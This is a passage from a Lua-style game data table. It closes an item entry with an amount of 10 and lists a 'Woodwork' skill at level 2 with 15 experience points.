            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 15
        }
    }
}
